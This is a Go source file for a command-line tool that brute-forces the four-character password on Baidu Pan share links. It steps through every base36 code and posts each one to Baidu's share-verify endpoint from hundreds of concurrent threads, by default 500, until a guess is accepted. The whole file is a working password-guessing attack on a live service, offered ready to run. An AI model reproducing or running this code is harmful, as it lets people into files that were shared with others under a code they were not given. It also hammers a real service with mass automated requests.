package main

import (
	"flag"
	"fmt"
	"runtime"

	"io/ioutil"
	"net/http"
	"net/url"

	"github.com/pa001024/reflex/util"
)

type BaiduYunTester struct {
	URL     string
	StartAt string // TODO
	testUrl string
	Result  string
	debug   bool
}

func NewBaiduYunTester(urlstr, startat string) (v *BaiduYunTester) {
	v = &BaiduYunTester{
		URL:     urlstr,
		StartAt: startat,
	}
	v.testUrl = "http://pan.baidu.com/share/verify?" + urlstr[32:]
	return
}

func (this *BaiduYunTester) Run(threadCount int) string {
	in := make(chan string, 10)
	out := make(chan string)
	for i := 0; i < threadCount; i++ {
		go this.runWorker(in, out)
	}
	go func() {
		i := toInt(this.StartAt)
		// 36^4=1679616
		if i >= 1679616 {
			return
		}
		for {
			if this.Result != "" {
				break
			}
			in <- toBase36(i)
			i++
			if i%3600 == 0 {
				// fmt.Println("trying [" + toBase36(i) + "] ...")
				util.INFO.Log("trying [" + toBase36(i) + "] ...")
			}
		}
	}()

	this.Result = <-out
	return this.Result
}

func toBase36(v int) string {
	const key = "0123456789abcdefghijklmnopqrstuvwxyz"
	s := ""
	for i := 0; i < 4; i++ {
		s = string(rune(key[v%36])) + s
		v /= 36
	}
	return s
}

func toInt(s string) int {
	v := 0
	for i := 0; i < 4; i++ {
		v *= 36
		if s[i] < 60 {
			v += int(s[i] - 48)
		} else {
			v += int(s[i] - 87)
		}
	}
	return v
}

func (this *BaiduYunTester) runWorker(in, out chan string) {
	pwd := ""
	for {
		if this.Result != "" {
			break
		}
		pwd = <-in
		if this.runSingle(pwd) {
			out <- pwd
		}
	}
}

func (this *BaiduYunTester) runSingle(pwd string) bool {
	res, err := http.PostForm(this.testUrl, url.Values{"pwd": {pwd}})
	if err != nil {
		return false
	}
	bin, _ := ioutil.ReadAll(res.Body)
	res.Body.Close()
	if string(bin)[5:16] == `{"errno":0,` {
		return true
	}
	if this.debug {
		fmt.Println("try ["+pwd+"] fail", string(bin)[6:16])
	}
	return false
}

func (this *BaiduYunTester) SetDebug(b bool) {
	this.debug = b
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	j := flag.Int("j", 500, "threads of http get")
	u := flag.String("u", "", "baidu pan url like http://pan.baidu.com/share/init?shareid=2820668751&uk=3793282542")
	at := flag.String("at", "0000", "start at")
	isDebug := flag.Bool("d", false, "is debug?")
	flag.Parse()
	// fmt.Println("using", runtime.NumCPU(), "CPU cores")
	util.INFO.Log("using ", runtime.NumCPU(), " CPU cores ", *j, " threads")
	if *u == "" {
		flag.Usage()
		return
	}
	// fmt.Println("start test url:", *u)
	util.INFO.Log("start test url:", *u)

	o := NewBaiduYunTester(*u, *at)
	if *isDebug {
		o.SetDebug(true)
	}
	o.Run(*j)
	// fmt.Println("result:", o.Result)
	util.INFO.Log("result: ", o.Result)
}
